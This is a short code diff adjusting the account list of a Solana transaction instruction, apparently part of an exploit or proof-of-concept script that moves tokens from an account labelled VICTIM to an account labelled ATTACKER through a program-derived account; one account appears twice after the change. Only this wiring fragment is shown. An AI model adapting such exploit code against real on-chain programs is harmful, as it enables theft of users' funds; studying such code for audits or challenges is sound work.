@@ -82,12 +82,12 @@
         keys: [
           { pubkey: publicKey, isSigner: true, isWritable: true },
           { pubkey: TOKEN_ACCOUNT_VICTIM, isSigner: false, isWritable: true },
-          { pubkey: PROGRAM_ID, isSigner: false, isWritable: false },
+          { pubkey: PDA_ACCOUNT, isSigner: false, isWritable: true },
           { pubkey: ATTACKER_WALLET, isSigner: false, isWritable: false },
           { pubkey: TOKEN_ACCOUNT_ATTACKER, isSigner: false, isWritable: true },
           { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
           { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
-          { pubkey: PDA_ACCOUNT, isSigner: false, isWritable: true },
+          { pubkey: PDA_ACCOUNT, isSigner: false, isWritable: true }
         ],
         programId: PROGRAM_ID,
         data: new Uint8Array([])
